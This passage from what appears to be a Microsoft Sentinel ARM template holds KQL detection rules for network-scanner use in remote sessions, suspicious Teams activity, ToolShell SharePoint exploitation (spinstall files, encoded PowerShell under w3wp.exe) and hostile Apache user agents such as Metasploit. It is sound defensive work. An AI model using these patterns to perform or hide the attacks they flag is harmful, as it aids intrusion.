typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};  \nDeviceProcessEvents\n| where TimeGenerated > ago(start_time) and TimeGenerated < end_time\n| where ActionType == 'ProcessCreated'\n| where IsProcessRemoteSession\n| where (FileName has_any ('advanced_ip_scanner', 'ipscan', 'advanced_port_scanner') or ProcessCommandLine has_any ('advanced_ip_scanner', 'ipscan', 'advanced_port_scanner')) and ProcessCommandLine has_any ('/portable', '-portable') \n//and InitiatingProcessParentFileName has_any ('explorer.exe')\n| where FolderPath !has 'Program Files'     \n| summarize\n    bv_event_count = count()\n    , bv_start_time = min(TimeGenerated)\n    , bv_end_time = max(TimeGenerated)\n    , bv_user = make_set(AccountUpn, 10)\n    , bv_parent_file_name = make_set(InitiatingProcessParentFileName, 10)\n    , bv_file_path = make_set(FolderPath, 10)\n    , bv_file_name = make_set(FileName, 10)\n    , bv_process_command_line = make_set(ProcessCommandLine, 10)     \n    by bv_dest_dvc = DeviceName, bv_src_dvc = InitiatingProcessRemoteSessionDeviceName\n| invoke match(exclusions, 'exclusion')\n| where match_status != 'exclusion'\n| invoke description(excluded_description_fields, 300, 5)\n| extend bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, visibility, rba_score)\n    , bv_dedup_hash = hash_sha1(bv_src_dvc)\n| where BV_FUN_DEDUP(alert_id,ago(start_time_suppress)) !has bv_dedup_hash              \n| extend \n    bv_alarm_attacker_entities = pack_array(bv_src_dvc)\n    , bv_alarm_victim_entities = array_concat(pack_array(bv_dest_dvc), bv_user)\n    , bv_user1 = bv_user[0]\n    , bv_mapping_tag = bv_src_dvc\n| project-keep bv_*, ExtendedDescription",
          "queryFrequency": "PT15M",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Discovery",
            "LateralMovement"
          ],
          "techniques": [
            "T1046",
            "T1087",
            "T1016",
            "T1018",
            "T1021"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-11601: [SOC] Defender - Use Of Network Recon Tools During Remote Sessions",
            "alertDescriptionFormat": "This detection identifies potential adversarial reconnaissance activity when network scanning tools (like Advanced IP Scanner) or Living-off-the-Land binaries (LOLBins) are executed in portable mode during an interactive remote session. Attackers frequently leverage these tools during lateral movement phases to identify and map network resources after gaining initial access via RDP or other remote management tools. This behavior pattern is strongly associated with ransomware operations and other targeted attacks.\n\n{{ExtendedDescription}}\n\ntag: SOC\nCategory: Microsoft Defender XDR\nMITRE: T1046 MITRE: T1087 MITRE: T1016 MITRE: T1018 MITRE: T1021"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_user1"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_src_dvc"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_dest_dvc"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-21097')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-21097')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-21097: [SOC] Change - OfficeActivity - Teams Activity From Suspicious User",
          "description": "This detection identifies when a Microsoft Teams chat or meeting is created by a user who has shown no prior activity in the environment within the last 3 days. Such behavior may indicate account takeover, insider threat activity, or an attacker leveraging compromised credentials to establish communication channels for data exfiltration or command and control.\n\ncim_models: change MITRE: T1078,T1136,T1534,T1098,T1199 Category: BVIM,Office 365 tag: SOC",
          "severity": "Low",
          "enabled": true,
          "query": "let alert_id = 'BV-21097';\nlet alert_type = 'SOC';\nlet start_time = 1h;\nlet exclude_hash = true;\nlet calculate_hash = true;      \nlet max_description_line = 300;\nlet max_description_list_length = 5;\nlet start_time_suppress = 47h;\nlet start_time_historical = 3d;\nlet end_time = now();\nlet alert_bin = 1h;\nlet global_config = dynamic({\n    'excluded_dedup_hash_fields': dynamic(['bv_rule', 'bv_vendor', 'bv_dest_', 'bv_src', 'bv_comm_type'])     \n});\nlet excluded_description_fields = dynamic(['bv_raw', 'bv_vendor_action1']);\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);\nlet exclusions = array_concat(global_config['EXCLUSIONS'], BV21097_CONFIG['EXCLUSIONS'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV21097_CONFIG['RBASCORE']),1.0);\nlet gen_detail_and_hash = (t: (*), ef:dynamic=dynamic([]), mfl:int=300, mal:int=5, efd:dynamic=dynamic([]), dh:boolean=true){\n        t\n        | extend a = pack_all()\n        | extend k = array_sort_asc(bag_keys(a))\n        | mv-apply k to typeof(string) on (\n            extend v = todynamic(tostring(a[k]))\n            | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n            | extend \n                vl = iff(array_length(v) == 1 and isempty(v[0]),0,array_length(v))\n                , vf = k startswith 'bv_' and not (k has_any (efd))\n            | extend vv = vl == 1 \n            | extend \n                df = iff(vf and vv, k, '')\n                , dv = iff(vf and vv, v[0], '')\n            | extend e = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (ef)), strcat(\n                case(vl > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(v,0,(mal-1)),'\\n* '),0,mfl), '\\n')\n                , vl == 1, strcat(k,': ', v[0])\n                , '')\n                ),'')\n                | summarize \n                    e = make_set(e)\n                    , bv_dedup_fields = make_set_if(df, isnotempty(df))\n                    , bv_dedup_values = make_set_if(dv, isnotempty(dv))\n        )\n        | extend \n            ExtendedDescription=strcat_array(e, '\\n ')\n            , bv_dedup_hash = columnifexists('bv_dedup_hash', '')\n        | extend bv_dedup_hash = iff(dh,hash_sha1(strcat_array(bv_dedup_values,'')),bv_dedup_hash)\n  };\n        let match = (table_parameter: (*), items:dynamic, match_type: string){\n          table_parameter\n          | extend all_data = pack_all()\n          | mv-apply e = items on (\n              extend keys = bag_keys(e)\n              | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n              | mv-apply k = keys to typeof(string) on (\n                  extend list = split(e[k],',')\n                  | mv-apply l = list to typeof(string) on (\n                      extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                      | mv-apply i = item to typeof(string) on (\n                          extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                          | summarize excluded_count = countif(compare)\n                          | extend item_excluded = excluded_count > 0\n                      )\n                      | summarize excluded_count = countif(item_excluded)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_list_item = countif(item_excluded > 0)\n              )\n              | extend matched =  key_count == excluded_list_item and key_count != 0\n              | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n              | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n              | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n          )\n          | extend match_status = iff(matched contains \"true\", match_type, '')\n  };\n  let desc_gen = (T: (*), ttype:string){\n    T\n    | extend a = pack_all()\n    | extend t = tostring(a[ttype])\n    | extend t = replace('\\n', '@new_line@',t)\n    | extend ot = extract_all(@'(\\[.*?\\])',t)\n    | mv-apply o = ot on (\n        parse o with * '~' k'~' *\n        | extend v = todynamic(a[k])\n        | extend v = iff(gettype(v) !='array', pack_array(v), v)\n        | extend r = iff(isempty(v) or (array_length(v) == 1 and (isempty(v[0]) or v[0] == 0) or array_length(v)==0),'',o)\n        | extend r = trim_end(@'\\]',r)\n        | extend r = trim_start(@'\\[.*~',r)\n        | summarize otr =make_list(r)\n    )\n    | extend tr = replace_strings(t, ot, otr )\n    | extend sdk = extract_all(@'(<bv_[\\w_]*>)',tr)\n    | extend gk = extract_all(@'(<g_bv_[\\w_]*>)',tr)\n    | mv-apply g = gk on (\n        parse g with '<g_' key '_p' *\n        | parse g with * '_p_' verb '>'\n        | extend v = a[key]\n        | extend ip = (gettype(v) == 'array' and array_length(v) > 1) or toint(v)>1\n        | extend r = case (\n            isempty(verb) and not(ip), ''\n            , isempty(verb) and ip, 's'\n            , verb == 'was' and (not(ip) or isempty(ip)), 'was'\n            , verb == 'was' and ip, 'were'\n            , verb == 'this' and ip, 'these'\n            , verb == 'this' and not(ip), 'this'\n            , verb == 'is' and (not(ip) or isempty(ip)), 'is'\n            , verb == 'is' and ip, 'are'\n        ,''\n        )\n        | summarize gr = make_list(r)\n    )\n    | mv-apply k = sdk on (\n        parse k with '<' key '>'\n        | extend v = todynamic(tostring(a[key]))\n        | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n        | extend vl = array_length(v)\n        | extend r = case(\n            vl == 1, v[0]\n            , vl == 2, strcat(v[0], ' and ', v[1])\n            ,vl  > 2, strcat(v[0], ', ', v[1], ', and ', vl-2, ' others')\n            ,'')\n    | summarize r = make_list(r))\n    | extend dr = replace_strings(tr, sdk, r)\n    | extend dr = replace_strings(dr, gk, gr)\n    | extend dr = replace('@new_line@', '\\n',dr)\n    | extend hd = coalesce(a['desc_gen'],dynamic({}))\n    | extend desc_gen = bag_set_key(hd, ttype, dr)\n  };\n  let rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n    | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n        let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n    | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n        table_parameter\n        | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n        | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n        | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n        | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n        | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n        | extend ModifiedRBAScore = case(\n          ModifiedRBAScore > 10, 10.0\n          , ModifiedRBAScore <0.1, 0.1\n          , ModifiedRBAScore\n        )\n        | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n  };            \nlet TeamsChatAct = materialize(\nbvim_officeactivity(starttime=ago(start_time_historical), endtime=end_time, bv_tags_has='user,change')\n| project bv_start_time, bv_vendor_action, bv_vendor_product_version, bv_connector, sourcetype, bv_parser, bv_src_user, bv_src_ip, bv_dest_user, bv_src_user_type, bv_user, bv_raw, tag\n| extend bv_comm_type = tostring(parse_json(bv_raw).CommunicationType)\n  , bv_members = parse_json(bv_raw).Members\n| project-away bv_raw\n| where bv_vendor_product_version == 'MicrosoftTeams' and ((bv_vendor_action == 'ChatCreated' and bv_comm_type == 'OneOnOne') or bv_vendor_action == 'MeetingCreated')\n| extend bv_dest_user = tostring(bv_members[1].UPN)\n| where isnotempty(bv_dest_user)\n);\nlet KnownUsers = toscalar(TeamsChatAct\n| where bv_start_time <= ago(start_time)\n| summarize make_set(bv_user));\nTeamsChatAct\n| where bv_start_time > ago(start_time)\n| where bv_user !in~ (KnownUsers)\n| parse bv_user with username '@' domain_name\n| parse bv_dest_user with dest_username '@' dest_domain_name\n| where strcat('@',domain_name) !in~ (DOMAINS) and domain_name !in~ (DOMAINS) and domain_name !~ dest_domain_name and split(domain_name, '.')[0] !contains split(dest_domain_name, '.')[0] \n| where tolower(domain_name) matches regex @'\\.onmicrosoft\\.com' and bv_user !has '#EXT#'\n| summarize \n        bv_start_time = min(bv_start_time)\n        , bv_end_time = max(bv_start_time)\n        , bv_event_count = count()\n        , bv_vendor_action = make_set(bv_vendor_action, 5)\n        , bv_src_ip = make_set(bv_src_ip, 5)\n        , bv_dest_user = make_set(bv_dest_user, 5)\n        , bv_comm_type = make_set(bv_comm_type, 5)\n    by \n        bv_user\n| invoke match(exclusions, 'exclusion')\n| extend excluded = iff((alert_type in ('SOC','CUSTOM') and match_status == 'exclusion') or (alert_type == 'RBA' and visibility contains '0'), true, false)\n| where excluded == false\n| extend alert_id_temp = alert_id\n| lookup bv_desc_temp on alert_id_temp\n| invoke desc_gen('long_template')\n| invoke desc_gen('short_template')\n| invoke gen_detail_and_hash(excluded_description_fields, 300, 5,efd=excluded_dedup_fields,dh=calculate_hash)\n| where iff(exclude_hash, (BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash), true)\n| extend \n    bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, visibility, rba_score)   \n    , bv_desc_l = strcat(desc_gen['long_template'],'\\n\\n',ExtendedDescription)\n    , bv_desc_s =desc_gen['short_template']\n| extend \n    bv_alarm_attacker_entities = pack_array(bv_user)\n    , bv_alarm_victim_entities = bv_dest_user            \n    , bv_mapping_tag = bv_user\n    , bv_dest_user1 = bv_dest_user[0]\n    , bv_dest_user2 = bv_dest_user[1]\n    , bv_vendor_action1 = bv_vendor_action[0]    \n| project-keep\n    bv_*   ",
          "queryFrequency": "PT1H",
          "queryPeriod": "P3D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "PrivilegeEscalation",
            "Persistence",
            "DefenseEvasion",
            "LateralMovement"
          ],
          "techniques": [
            "T1078",
            "T1136",
            "T1534",
            "T1098",
            "T1199"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-21097: [SOC] Change - OfficeActivity - Teams Activity {{bv_vendor_action1}} By {{bv_user}}",
            "alertDescriptionFormat": "This detection identifies when a Microsoft Teams chat or meeting is created by a user who has shown no prior activity in the environment within the last 3 days. Such behavior may indicate account takeover, insider threat activity, or an attacker leveraging compromised credentials to establish communication channels for data exfiltration or command and control.\n\n{{bv_desc_l}}\n\ntag: SOC\nCategory: BVIM\ncim_models: change\nMITRE: T1078 MITRE: T1136 MITRE: T1534 MITRE: T1098 MITRE: T1199"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "VictimEntity": "bv_alarm_victim_entities",
            "RBAScore": "bv_alarm_rba_score",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_dest_user1"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_dest_user2"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/b6e6b97c-2ff0-4167-8162-a4d10e8f9128')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/b6e6b97c-2ff0-4167-8162-a4d10e8f9128')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Toolshell Sharepoint Vulnerability",
          "description": "",
          "severity": "High",
          "enabled": true,
          "query": "DeviceFileEvents\r\n| where InitiatingProcessFileName=~\"powershell.exe\"\r\n| where FileName contains \"spinstall\"",
          "queryFrequency": "PT30M",
          "queryPeriod": "PT40M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/94079bd9-24cd-4585-8f22-2252a6563bd1')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/94079bd9-24cd-4585-8f22-2252a6563bd1')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Toolshell Sharepoint Vulnerability",
          "description": "https://msrc.microsoft.com/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770/",
          "severity": "High",
          "enabled": true,
          "query": "DeviceProcessEvents\r\n| where InitiatingProcessFileName has \"w3wp.exe\"\r\n  and InitiatingProcessCommandLine !has \"DefaultAppPool\"\r\n  and FileName =~ \"cmd.exe\"\r\n  and ProcessCommandLine has_all (\"cmd.exe\", \"powershell\")\r\n  and ProcessCommandLine has_any (\"EncodedCommand\", \"-ec\")\r\n| extend CommandArguments = split(ProcessCommandLine, \" \")\r\n| mv-expand CommandArguments to typeof(string)\r\n| where CommandArguments matches regex \"^[A-Za-z0-9+/=]{15,}$\"\r\n| project Timestamp, DeviceName, InitiatingProcessCommandLine, ProcessCommandLine, CommandArguments",
          "queryFrequency": "PT30M",
          "queryPeriod": "PT40M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/a803c96f-4e43-4d1c-911b-26405e2c8b3d')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/a803c96f-4e43-4d1c-911b-26405e2c8b3d')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Toolshell SharePoint Vulnerability",
          "description": "https://msrc.microsoft.com/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770/",
          "severity": "High",
          "enabled": true,
          "query": "DeviceFileEvents\r\n| where FolderPath has_any (\"microsoft shared\\\\Web Server Extensions\\\\15\\\\TEMPLATE\\\\LAYOUTS\", \"microsoft shared\\\\Web Server Extensions\\\\16\\\\TEMPLATE\\\\LAYOUTS\")\r\n| where FileName contains \"spinstall\"\r\n| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, FolderPath, ReportId, ActionType, SHA256\r\n| order by Timestamp desc",
          "queryFrequency": "PT30M",
          "queryPeriod": "PT40M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/6832b1d4-8263-4468-9f24-cb37907ea47e')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/6832b1d4-8263-4468-9f24-cb37907ea47e')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "NGINX - Private IP address in URL",
          "description": "Detects requests to unusual URL",
          "severity": "Medium",
          "enabled": false,
          "query": "NGINXHTTPServer\n| where HttpReferrerOriginal !contains \"Tableauserver.dcss.ca.gov\"\n| where UrlOriginal matches regex @'(10\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})|(172\\.1[6-9]\\.\\d{1,3}\\.\\d{1,3})|(172\\.2[0-9]\\.\\d{1,3}\\.\\d{1,3})|(172\\.3[0-1]\\.\\d{1,3}\\.\\d{1,3})|(192\\.168\\.\\d{1,3}\\.\\d{1,3})'\n| extend UrlCustomEntity = UrlOriginal\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "UrlCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/d3894e5b-f62a-40d7-8d7b-716557cf367b')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/d3894e5b-f62a-40d7-8d7b-716557cf367b')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Apache - Multiple client errors from single IP",
          "description": "Detects multiple client errors from one source in short timeframe",
          "severity": "Medium",
          "enabled": false,
          "query": "let threashold = 100;\nApacheHTTPServer\n| where tolong(HttpStatusCode) >= 400 and tolong(HttpStatusCode) <= 499\n| summarize MultipleClientErrors = count() by SrcIpAddr, bin(TimeGenerated, 5m)\n| where MultipleClientErrors > threashold\n| extend IPCustomEntity = SrcIpAddr\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/7724fee0-f0b1-46f7-80f9-80d6baf6925a')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/7724fee0-f0b1-46f7-80f9-80d6baf6925a')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Apache - Request from private IP",
          "description": "Detects requests from private IP",
          "severity": "Medium",
          "enabled": false,
          "query": "ApacheHTTPServer\n| where ipv4_is_private(SrcIpAddr)\n| extend IPCustomEntity = SrcIpAddr\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact",
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/c90c0544-c116-4f87-8427-76fd0e1fe407')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/c90c0544-c116-4f87-8427-76fd0e1fe407')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Apache - Known malicious user agent",
          "description": "Detects known malicious user agents",
          "severity": "Medium",
          "enabled": false,
          "query": "ApacheHTTPServer\n| where HttpUserAgentOriginal has_any (\"Metasploit\" , \"360Spider\", \"404checker\", \"AllSubmitter\", \"BackDoorBot\", \"CATExplorador\")\n| extend MalwareCustomEntity = HttpUserAgentOriginal\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
